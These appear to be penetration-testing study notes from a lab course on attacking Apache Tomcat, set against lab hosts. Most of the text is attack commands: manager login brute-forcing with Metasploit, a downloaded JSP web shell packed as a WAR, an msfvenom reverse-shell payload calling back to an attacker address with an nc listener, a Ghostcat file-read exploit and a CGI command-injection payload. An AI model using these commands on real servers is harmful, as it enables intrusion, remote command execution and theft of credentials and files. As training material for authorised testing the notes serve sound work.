
**Manager**:`/manager`

```jsx
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost
```

The `bin` folder stores scripts and binaries needed to start and run a Tomcat server. The `conf` folder stores various configuration files used by Tomcat. The `tomcat-users.xml` file stores user credentials and their assigned roles. The `lib` folder holds the various JAR files needed for the correct functioning of Tomcat. The `logs` and `temp` folders store temporary log files. The `webapps` folder is the default webroot of Tomcat and hosts all the applications. The `work` folder acts as a cache and is used to store data during runtime.

Each folder inside `webapps` is expected to have the following structure.

```
webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml
    └── lib
    |    └── jdbc_drivers.jar
    └── classes
        └── AdminServlet.class

```

The most important file among these is `WEB-INF/web.xml`

```
<?xml version="1.0" encoding="ISO-8859-1"?>

<!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd">

<web-app>
  <servlet>
    <servlet-name>AdminServlet</servlet-name>
    <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>AdminServlet</servlet-name>
    <url-pattern>/admin</url-pattern>
  </servlet-mapping>
</web-app>
```

All compiled classes used by the application should be stored in the WEB-INF/classes folder. These classes might contain important business logic as well as sensitive information. Any vulnerability in these files can lead to total compromise of the website. The lib folder stores the libraries needed by that particular application. The jsp folder stores Jakarta Server Pages (JSP), formerly known as JavaServer Pages, which can be compared to PHP files on an Apache server.

The `tomcat-users.xml` file is used to allow or disallow access to the `/manager` and `host-manager` admin pages.

The file shows us what each of the roles `manager-gui`, `manager-script`, `manager-jmx`, and `manager-status` provide access to.

### Enumeration

**Version Fingerprinting**

`L3pr3ch4un@htb[/htb]$ curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat`

**Directory Busting**

`L3pr3ch4un@htb[/htb]$ gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt`

**Login Brute forcing**

```
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
```

`Wordlists`

- User: /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt
- Pass: /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt

**Code Execution**

Shell:`https://github.com/SecurityRiskAdvisors/cmd.jsp`

![](https://academy.hackthebox.com/storage/modules/113/vt2.png)

```
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backdoor.war cmd.jsp 
```

This file is uploaded to the manager GUI, after which the `/backdoor` application will be added to the table.

`[!bash!]$ curl http://web01.inlanefreight.local:8180/backup/backdoor.jsp?cmd=id`

**Reverse Shell**

```
[!bash!]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backdoor.war
```

Listner: `nc -lnvp 4443`

**Automation**

`exploit/multi/http/tomcat_mgr_upload/`

### Vulnerabilities

**CVE-2020-1938 : Ghostcat**

- Versions before 9.0.31, 8.5.51, and 7.0.100
- https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
- `[!bash!]$ python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml`

**Tomcat CGI**

**CVE-2019-0232** is a critical security issue that could result in remote code execution. This vulnerability affects Windows systems that have the enableCmdLineArguments feature enabled. An attacker can exploit this vulnerability by exploiting a command injection flaw resulting from a Tomcat CGI Servlet input validation error, thus allowing them to execute arbitrary commands on the affected system. Versions 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93 of Tomcat are affected.

**Note**: This option should be enabled `enableCmdLineArguments`

`http://example.com/cgi-bin/hello.bat?&dir`

```
L3pr3ch4un@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
L3pr3ch4un@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```








